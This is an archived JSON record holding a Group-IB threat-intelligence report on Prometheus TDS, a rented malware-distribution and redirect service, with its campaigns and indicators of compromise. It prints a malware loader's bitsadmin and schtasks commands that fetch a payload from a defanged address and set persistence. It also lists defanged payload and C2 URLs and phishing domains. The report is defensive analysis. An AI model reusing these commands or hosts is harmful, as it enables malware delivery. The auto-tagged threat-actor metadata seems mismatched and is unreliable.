{
    "id": "ad7caada-df1c-4f77-a830-3bd547670a29",
    "created_at": "2023-01-12T15:02:59.056016Z",
    "updated_at": "2025-03-27T02:08:40.189561Z",
    "deleted_at": null,
    "sha1_hash": "1a9b8274d9a348c91739ef6fb731f93cf699bc58",
    "title": "2021-08-05 - Prometheus TDS The key to success for Campo Loader, Hancitor, IcedID, and QBot",
    "authors": "",
    "file_creation_date": "2022-05-28T17:06:09Z",
    "file_modification_date": "2022-05-28T17:06:09Z",
    "file_size": 5306732,
    "plain_text": "# Prometheus TDS\n\n**blog.group-ib.com/prometheus-tds**\n\n05.08.2021\n\nThe key to success for Campo Loader, Hancitor, IcedID, and QBot\n\nViktor Okorokov\n\nLead Threat Intelligence analyst\n\n\n-----\n\nNikita Rostovcev\n\nThreat Intelligence analyst\n\n**Introduction**\n\n[In the spring of 2021, Group-IB's Threat Intelligence analysts discovered traces of a malware](https://www.group-ib.com/intelligence-attribution.html?utm_source=blog_post&utm_campaign=prometheus&utm_medium=organic)\ncampaign distributing Hancitor. The researchers took an interest in an untypical pattern of\nthe downloader's distribution, which was subsequently described by Unit 42[1] and McAfee[2]\nresearchers as a new technique designed to hide documents containing malicious links from\nweb scanners' radars. However, the data extracted by Group-IB's analysts indicates that a\nsimilar pattern is also used to distribute malware such as Campo Loader, IcedID, QBot,\nSocGholish, and Buer Loader.\n\nGroup-IB discovered at least 3,000 targets of separate malware campaigns that make use of\nthe same scheme. By analyzing the list of targets, the experts were able to establish the two\nmost active campaigns. The first targeted individuals in Belgium, and the second targeted\ncompanies, corporations, universities, and government organizations in the United States.\n\nBy analyzing the malware distribution campaigns, Group-IB's experts were able to conclude\nthat it was possible for them to be carried out using the same MaaS solution. This\nassumption was later confirmed by Group-IB's analysts after they found a sale notice for a\nservice designed to distribute malicious files and redirect users to phishing and malicious\nsites — Prometheus TDS (Traffic Direction System) — on one of the underground platforms.\n**Description**\n\n\n-----\n\nPrometheus TDS is an underground service that distributes malicious files and redirects\nvisitors to phishing and malicious sites. This service is made up of the Prometheus TDS\nadministrative panel, in which an attacker configures the necessary parameters for a\nmalicious campaign: downloading malicious files, and configuring restrictions on users'\ngeolocation, browser version, and operating system.\n\nTo prevent victims of malicious campaigns from interacting with the administrative panel\ndirectly, which may result in the attacker's server being disclosed and blocked, Prometheus\nTDS uses third-party infected websites that act as a middleman between the attacker's\nadministrative panel and the user. It should also be mentioned that the list of compromised\nwebsites is manually added by the malware campaign's operators. The list is uploaded\nthrough importing links to web shells. A special PHP file named Prometheus.Backdoor is\nuploaded to the compromised websites to collect and send back data about the user\ninteracting with the administrative panel. After analyzing the data collected, the\nadministrative panel decides whether to send the payload to the user and/or to redirect them\nto the specified URL.\n\nMore than three thousand email addresses targeted in the first phase of malicious\ncampaigns in which Prometheus TDS was used to send malicious emails were extracted by\nGroup-IB Threat Intelligence analysts. The extracted data analysis helped identify the most\nactive campaigns, one targeting individuals in Belgium (more than 2,000 emails) and the\nother targeting US government agencies, companies, and corporations in various sectors\n(banking and finance, retail, energy and mining, cybersecurity, healthcare, IT, and\ninsurance), (more than 260 emails). The data about identified targets of attacks with the use\nof Prometheus TDS and companies affected as their result has been handed over to the US,\nGerman and Belgian CERTs.\n\n\n-----\n\n_Targets of malicious campaigns with the use of Prometheus TDS_\n\n**Attack scheme using Prometheus TDS**\n\nThe distribution of malware using Prometheus TDS is carried out in several stages.\n\n**Stage 1**\n\nThe user receives an email containing one of the following elements:\n\n- An HTML file that redirects the user to a compromised site on which Prometheus.Backdoor\nis installed;\n\n- A link to a web shell that redirects users to a specified URL, in this case to one of the\naddresses used by Prometheus TDS;\n\n- A link to a Google Doc containing the URL redirecting users to a malicious link.\n\n_The implementation of malicious campaigns with the use of Prometheus TDS_\n\n\n-----\n\n_Google Docs files used by Prometheus TDS_\n\n**Stage 2**\n\nThe user opens the attachment or follows the link and is redirected to the\nPrometheus.Backdoor URL. Prometheus.Backdoor collects the available data on the user.\n\n**Stage 3**\n\nThe data collected is sent to the Prometheus TDS admin panel. This admin panel then\ndecides whether to instruct the backdoor to send a malicious file to the users and/or to\nredirect them to the specified URL.\n\n**Analysis of Prometheus.Backdoor**\n\nMalicious campaigns using Prometheus TDS are carried out via hacked sites with\nPrometheus.Backdoor installed on them. The backdoor is controlled through the admin\npanel.\n\n\n-----\n\n_Prometheus TDS admin panel_\n\nThe data exchange between the administrative panel and the backdoor is encrypted with an\nXOR cipher. The key for this cipher is explicitly hardcoded in the Prometheus.Backdoor\nsettings, along with the address of the administrative panel used by the attackers to manage\nbackdoors on infected sites.\n\n\n-----\n\n_A fragment of the Prometheus.Backdoor code containing the address of the administrative_\n_panel, a key for encrypting transmitted data, and functions for encrypting and decrypting data_\n\nAfter the user visits the infected site, Prometheus.Backdoor collects basic information about\nthem: IP address, User-Agent, Referrer header, time zone, and language data, and then\nforwards this information to the Prometheus admin panel.\n\n\n-----\n\n_Part of the Prometheus.Backdoor code used to collect information about the user's time zone_\n\n\n-----\n\n_Part of the Prometheus.Backdoor code showing the algorithm used to generate a request to_\n_the administrative panel for the transfer of visitor data_\n\nIf the user is not recognized as a bot, then, depending on the configuration, the\nadministrative panel can send a command to redirect the user to the specified URL, or to\nsend a malicious file. The payload file is sent using a special JavaScript code. Most often,\nthe malicious software can be found in weaponized Microsoft Word or Excel documents,\nhowever, the attackers also use ZIP and RAR files. In some cases, the user will be\nredirected to a legitimate site immediately after downloading the file, so it will appear to them\nlike the file was downloaded from a safe source.\n\n\n-----\n\n_Part of the Prometheus.Backdoor code showing a method for serving malicious files_\n\n**Malware campaigns analysis**\n\n**Campo Loader**\n\nAnalyzing the extracted files, Group-IB Threat Intelligence analysts found 18 unique\nmalicious documents relating to the Campo Loader, aka the BazaLoader malware. After\n\n\n-----\n\ndownloading the malware, the user is redirected to the DocuSign or USPS sites as a\ndistraction from the malware's activity.\n\n_A screenshot of a decoy document from the \"Campo Loader\" distribution campaign_\n\nCampo Loader spreads through malicious macros in Microsoft Office documents. After the\nvictim activates the macros, the loader saves and then decodes the .dll file, which is\nexecuted through certutil. After the dumped .dll file is executed, it sends an HTTP request to\nits C&C server:\n\n_Content of the malicious macros_\n\nThe server processes the incoming request and, depending on the victim's geolocation\n(based on their IP address) decides whether to send the payload or redirect them to Yahoo!,\nGNU, or other resources. The downloader takes its name from the path of the same name in\nHTTP requests used to download malicious files during the second stage.\n\n\n-----\n\n_Redirection to gnu.org_\n\nIf the administrative panel gives the command to send the payload, then the user is\nredirected to the resource where it is stored or receives it directly from the C&C server.\n\n_Results of the request satisfying the server's requirements to upload a second stage file_\n\nAnalysis revealed that Campo Loader was used at various times to distribute TrickBot and\nUrsnif/Gozi bankers, etc.\n\n\n-----\n\n_Campo Loader administrative panel_\n\n**Hancitor**\n\nMonitoring of Prometheus TDS revealed 34 malicious documents relating to the Hancitor\nmalware, which is a downloader trojan.\n\n_A screenshot of a decoy document from the Hancitor distribution campaign_\n\n\n-----\n\nAfter downloading the malicious document, the victim is either redirected to the DocuSign\nwebsite, or to phishing sites using IDN domains that imitate the sites of two US banks.\n\n_A phishing page to which a user was redirected after downloading a malicious Hancitor load_\n_located on an IDN domain xn--keynvigatorkey-yp8g[.]com (https://urlscan.io/result/108463b8-_\n_7c0d-4644-9d2b-52cbca3426f8/)_\n\nOne of the files identified (SHA1: 41138f0331c3edb731c9871709cffd01e4ba2d88) was sent\nin a phishing email containing a link to a Google Doc. The document stored in Google Docs\ncontained the link hXXps://webworks.nepila[.]com/readies.php. When the victim clicks on the\nlink, a request is sent to Prometheus.Backdoor. The server then processes the data collected\nabout the user's system and decides whether to send the payload or not.\n\n\n-----\n\n_An example of requests to a site containing Prometheus.Backdoor, with successful delivery_\n_of a malicious document and subsequent redirection to DocuSign_\n\nThe screenshot above shows that the response to the first request for the file \"readies.php\"\nis 937 bits, while the second one is 424,594 bits. This means that the server approved the\nvictim's device settings and the second request resulted in the download of the Base64 file\n\"0301_343810790.doc\". After downloading the file, the victim is redirected to Docusign.com.\n\n\n-----\n\n_Part of the Prometheus.Backdoor code showing a malicious file distribution pattern_\n\nThe saved file \"0301_343810790.doc\" is a .doc file containing malicious macros. After\nactivating the macros in the document, the DLL file is dropped and executed by path\nc:\\users\\%username%\\appdata\\local\\temp\\Static.dll, using rundll32.exe. After the file has\nbeen executed, the following HTTP requests are sent:\n\n- hxxp://api.ipify[.]org/\n\n- hxxp://ementincied[.]com/8/forum.php\n\n- hxxp://mymooney[.]ru/6fwedzs3w3fg.exe\n\n\n-----\n\n_The downloaded file \"6fwedzs3w3fg.exe\" (SHA1:_\n_7394632d8cfc00c35570d219e49de63076294b6b ) is a sample of Ficker Stealer_\n\nIn April 2021, Unit 42 researchers partially analyzed this campaign. The experts also mention\nthe Ficker Stealer, Cobalt Strike, and Send-Safe spambots in their research\n(https://unit42.paloaltonetworks.com/hancitor-infections-cobalt-strike/).\n\n**QBot**\n\nThe following documents were found among the files used to distribute the banking trojan\nQBot.\n\nThese documents are lure files that require macro activation when launched. As soon as the\nmacros are activated, an HTTP request is sent to download the DLL file with the payload.\n\n_Decoy document from the QBot distribution campaign_\n\n\n-----\n\nThe malicious document discovered was sending requests to the following URL addresses:\n\n- https://inpulsion[.]net/ds/0702.gif\n\n- https://aramiglobal[.]com/ds/0502.gif\n\n_The content of malicious macros_\n\nUnfortunately, at the time of analysis, these files were no longer available. However, our data\nsuggests that QBot is loaded via these paths.\n\n**IcedID**\n\nOne of the malicious documents sent using Prometheus TDS distributed the banking Trojan\nIcedID, aka Bokbot.\n\n_A screenshot of a decoy document from the IcedID malware distribution campaign_\n\n\n-----\n\nAfter opening the document and running the macros, the office file attempted to download\nand run the DLL file at hXXp://denazao[.]info/images/1j.djvu. The file was not available at the\ntime of analysis. A similar office document was found on VirusTotal\n(https://www.virustotal.com/gui/file/ae93a0e0085bcae5ec9f21cb71df0b7d3a6682fa5c8ac4e7\n63f70884cb7bf5c6/details); it also downloaded the payload from\nhXXp://denazao[.]info/images/1j.djvu. After launching the payload, the request was sent to\nthe IcedID C&C server located at hXXp://twotimercvac[.]uno/.\n\n_Graph representing the IcedID C2 environment_\n\n\n-----\n\n**VBS Loader**\n\nDuring the analysis, the specialists found three samples of an unidentified VBS loader. After\ndownloading these files, the user is redirected to the USPS website. When the user clicks on\na malicious link, Prometheus TDS asks the user to download a ZIP archive containing a VBS\nscript. After the script is launched, the payload is downloaded in the form of another VBS\nscript using bitsadmin. The downloaded file is launched using the Windows Task Scheduler\nby creating a command that runs the VBS script every 30 minutes starting at 00:00.\n\n_Part of the obfuscated VBS loader containing the URL for the payload download_\n\nTo download and run the payload, the VBS script executes a set of special commands using\nbitsadmin and schtasks:\n\n- cmd /k exit | exit & bitsadmin /create EncodingFirm & exit\n\n- cmd /k exit | exit & bitsadmin /addfile EncodingFirm\nhXXp://155[.]94[.]193[.]10/user/get/ButPrinciple1619186669 C:\\Users\\\n<User>\\AppData\\Local\\Temp\\DefineKeeps.tmp & exit\n\n- cmd /k exit | exit & bitsadmin /resume EncodingFirm & exit\n\n- cmd /k exit | exit & schtasks /create /sc minute /mo 30 /tn \"Task Update ButPrinciple\" /f /st\n00:00 /tr C:\\Users\\<User>\\AppData\\Local\\ButPrinciple\\ButPrinciple.vbs & exit\n\n- cmd /k exit | exit & bitsadmin /complete EncodingFirm & exit\n\n- cmd /k exit | exit & bitsadmin /reset & exit\n\nAt the time of analysis, there was only one similar VBS loader sample on VirusTotal, which\nwas detectable by only one antivirus solution.\n\n\n-----\n\n(https://www.virustotal.com/gui/file/a2bd96db3eb0f4e5ab3dd013b0a0ba69c7c84986925623d\nc31e3b911d963e1b9/details).\n\n_Antivirus detection for file fcd8674f8df4390d90dad6c31a3dd6f33d6a74de_\n\n**Buer Loader**\n\nWithin the campaign, the file \"document010498(1).zip\" was also distributed. It contained the\nfile \"document010498.jnlp\", which downloads the payload from the domain \"secure-docviewer[.]com\".\n\nUnfortunately, at the time of analysis, the domain was not active. Based on the contents of\nthe file, it seems reasonable to assume that it is a decoy document used to download files\nrelating to the second stage.\n\n_Contents of the file document010498.jnlp_\n\n\n-----\n\nAn analysis of the domain secure-doc-viewer[.]com by the experts using Group-IB s graph\nrevealed that the owner's name, as indicated in the WHOIS records of the domain, is \"artem\nv gushin.\" The analysis also showed that this name is connected to more than 50 domains.\n\n_Part of the connections of the domain secure-doc-viewer[.]com according to WHOIS records_\n\nAmong the related domains, researchers identified several of them using the same\nkeywords:\n\n- pdfsecure[.]net\n\n- securepdfviewer[.]com\n\n- invoicesecure[.]net\n\nThe domains are also related to .jnlp files, for example, \"invoice.jnlp\" (SHA1:\n[e3249b46e76b3d94b46d45a38e175ef80b7d0526).](https://app.any.run/tasks/1e73e6b5-1f70-4a00-a131-a5d34561c4df/)\n\n\n-----\n\n_Content of the invoice.jnlp_\n\nSeveral studies[3] indicate that the above domains are part of the Buer Loader distribution\ncampaign.\n\n**SocGholish**\n\nThe analysis of the URLs of the compromised sites used in the Prometheus TDS\ninfrastructure revealed that some of them redirect the user to the home page of the\ncompromised website.\n\n_Prometheus.Backdoor URL that redirects the visitor to the home page of the compromised_\n_site_\n\n\n-----\n\nThrough research, it was discovered that these sites are used to distribute the SocGholish\nmalware under the guise of Google Chrome browser updates.\n\n_Loading a landing page with fake Google Chrome browser updates_\n\nAt the same time, SocGholish uses a malicious file distribution pattern very similar to the\nscript used by Prometheus TDS. When the user visits an infected site, they see a page with\nJavaScript code that contains a Base64 encoded ZIP archive with a malicious file that will be\ndownloaded if the user clicks on the \"Update browser\" button.\n\n_Part of the SocGholish landing page_\n\nTo the user, this page appears to be offering browser updates.\n\n\n-----\n\n_Screenshot of the fake page offering a Chrome browser update_\n\n**Fake VPN**\n\nIn addition to distributing malicious files, Prometheus TDS is also used as a classic TDS to\nredirect users to specific sites. One of these sites is the fake site of a well-known VPN\nprovider located at hXXps://huvpn[.]com/free-vpn/. Clicking the download button initiates the\ndownload of a malicious EXE file from hXXps://windscribe.s3.us-east2.amazonaws[.]com/Windscribe.exe (SHA1:\nf729b75d68824f200bebe3c3613c478f9d276501).\n\n\n-----\n\n_A screenshot of a fake Windscribe download page_\n\n**Viagra SPAM**\n\nPrometheus TDS also redirected users to sites selling pharmaceutical products. Operators of\nsuch sites often have affiliate and partnership programs. Partners, in turn, often resort to\naggressive SPAM campaigns in order to increase the earnings within the affiliate program.\nAnalysis of the Prometheus infrastructure by Group-IB specialists revealed links that redirect\nusers to sites relating to a Canadian pharmacy.\n\n\n-----\n\n_The use of Prometheus TDS for spam emails to redirect users to particular websites_\n\n**Banking phishing**\n\nPrometheus TDS was also used to redirect users to banking phishing sites. For example,\nduring a campaign active from March to May 2021, users who followed the link to\nPrometheus.Backdoor were redirected to fake sites that mimicked the site of a German\nbank.\n\n\n-----\n\n_Example of a phishing page used in the campaign involving Prometheus TDS_\n_https://urlscan.io/result/69c84104-f272-4c88-970f-a3131c0580ad/_\n\n**Offers to buy Prometheus TDS on underground forums**\n\nThe analysis presented above describes several unrelated campaigns carried out by\ndifferent hacker groups using Prometheus TDS. Working based on the assumption that\nPrometheus TDS is a MaaS solution, Group-IB researchers analyzed various underground\nforums in search of relevant offers and found a topic started by a user with the username\n**Main.**\n\n**Prometheus TDS**\n\n\n-----\n\n_Screenshot of the offer to buy the Prometheus TDS_\n\nGroup-IB [Threat Intelligence & Attribution system discovered that the post offering](https://www.group-ib.com/intelligence-attribution.html?utm_source=blog_post&utm_campaign=prometheus&utm_medium=organic)\nPrometheus for sale was created in August 2020. The owner of the service claimed that\nPrometheus TDS is an ANTIBOT redirect system designed to send out emails, work with\ntraffic, and for social engineering. In addition, Prometheus TDS can validate web shells,\ncreate and configure redirects, operate via proxy, and work with Google accounts, etc.\nMoreover, the system is able to validate users based on a blacklist, which makes it possible\nfor malicious links to avoid being added to antivirus and spam databases.\n\nPrometheus has two standard modes:\n\n1. Redirecting users to a target page;\n\n2. Issuing files for download (DOC, PDF, JS, VBS, EXE).\n\nThe cost of the system is $250 per month. Screenshots from Prometheus TDS admin level\nprovided by Main can be found below:\n\n**BRChecker**\n\n\n-----\n\nWhen examining and monitoring the infrastructure used to host the Prometheus TDS\nadministrative panels, Group-IB experts discovered that some of the servers on which the\nPrometheus TDS admin panel was previously located now host another unknown panel.\n\nThe following is a list of addresses at which different panels were located at different times:\n\n- 188.130.138[.]63;\n\n- 188.130.138[.]22;\n\n- 188.130.138[.]236;\n\n- 188.130.138[.]61;\n\n- 185.186.142[.]32.\n\nBased on the contents of this admin panel's JS scripts, Group-IB experts assumed that it is a\npanel from another solution called BRChecker.\n\n_Listing of scripts from BRCheker admin panel_\n\nAn offer to sell the BRChecker system presented as an email address bruter\\checker was for\nthe first time posted by the user with the username Mainin mid-June 2018. According to the\ndeveloper's description, the system works via modules (workers), installed on rented VPS\nservers, and controlled through a single admin panel for subsequent brute-forcing or\nverification of login/password bindings.\n\n\n-----\n\n_Screenshot of a sale announcement for BRCheker_\n\nAs of May 2021, the cost of the system was $490. Screenshots of BRChecker admin panel\nprovided by Main can be found below:\n\n\n-----\n\n_Screenshot of the BRChecker admin panel_\n\nThe contents of the screenshots in the for-sale notice made it possible to verify that the\nunknown panel detected before is indeed related to BRChecker.\n\n**Indicators**\n\n**Prometheus.Backdoor JavaScript**\n\n**Prometheus TDS Admin**\n\n109.248.11.132\n\n109.248.11.204\n\n109.248.11.67\n\n109.248.203.10\n\n109.248.203.112\n\n109.248.203.168\n\n109.248.203.198\n\n109.248.203.202\n\n109.248.203.207\n\n109.248.203.23\n\n\n-----\n\n109.248.203.33\n185.158.114.121\n185.186.142.191\n185.186.142.32\n185.186.142.59\n185.186.142.67\n185.186.142.77\n188.130.138.130\n188.130.138.22\n188.130.138.236\n188.130.138.57\n188.130.138.61\n188.130.138.63\n188.130.138.70\n188.130.139.103\n188.130.139.203\n188.130.139.228\n188.130.139.5\n188.130.139.88\n46.8.210.13\n46.8.210.30\n51.15.27.25\n62.138.0.68\n\n**Campo Loader**\n\n**Hancitor**\n\n**Qbot**\n\n**IcedID**\n\n**VBS Loader**\n\n**Buer Loader**\n\n**SocGholish**\n\n**Fake VPN**\n\n**Pharma spam**\n\n- hotaiddeal.su\n\n- yourmedsquality.su\n\n\n-----\n\n- goodherbwebmart.com\n\n- ella.purecaremarket.su\n**Phishing websites**\n\n- banking.sparkasse.de-id1897ajje9021ucn9021345345b0juah10zb1092uhda.xyz\n\n- banking.sparkasse.de-id1897ajjed9021uc421sn9345514ah10zb4351092uhda.xyz\n\n- banking.sparkasse.de-id1877au901501fj82a7fn3a54dx2gsboac8s02bauc248naxx.xyz\n\n- banking.sparkasse.de-id1877au901501fj82a7fnat9bhwhboa8ss02bauc248naxx.xyz\n\n- banking.sparkasse.de-id1877au901501fj82ca7fnas9sbssdfhswahboa802bauc248naxx.xyz\n\n- banking.sparkasse.deid1877au901501fj82ca7cf2nas9bswsdfhaswhboa802bauc248naxx.xyz\n\n- banking.sparkasse.de-id-19dhjb732ba9nabcz29acb78s21acz19icnba7s.xyz\n**Other samples**\n\n**BRChecker Admin panel**\n\n109.248.11.85\n109.248.203.202\n109.248.203.50\n185.186.142.32\n185.212.131.44\n188.130.138.16\n188.130.138.22\n188.130.138.236\n188.130.138.61\n188.130.138.63\n188.130.139.107\n188.130.139.158\n195.62.53.109\n\n\n-----\n\n[1] https://unit42.paloaltonetworks.com/hancitor-infections-cobalt-strike/\n\n[2] https://www.mcafee.com/blogs/other-blogs/mcafee-labs/hancitor-making-use-of-cookies\nto-prevent-url-scraping/?web_view=true\n\n\n\n[[3] https://labs.vipre.com/buer-loader-found-in-an-unusual-email-attachment/](https://labs.vipre.com/buer-loader-found-in-an-unusual-email-attachment/)\n\n[https://socinvestigation.com/threat-intelligence-buerloader-malware-latest-iocs/](https://socinvestigation.com/threat-intelligence-buerloader-malware-latest-iocs/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-08-05 - Prometheus TDS The key to success for Campo Loader, Hancitor, IcedID, and QBot.pdf"
    ],
    "report_names": [
        "2021-08-05 - Prometheus TDS The key to success for Campo Loader, Hancitor, IcedID, and QBot.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535779,
    "ts_updated_at": 1743041320,
    "ts_creation_date": 1653757569,
    "ts_modification_date": 1653757569,
    "files": {
        "pdf": "https://archive.orkl.eu/1a9b8274d9a348c91739ef6fb731f93cf699bc58.pdf",
        "text": "https://archive.orkl.eu/1a9b8274d9a348c91739ef6fb731f93cf699bc58.txt",
        "img": "https://archive.orkl.eu/1a9b8274d9a348c91739ef6fb731f93cf699bc58.jpg"
    }
}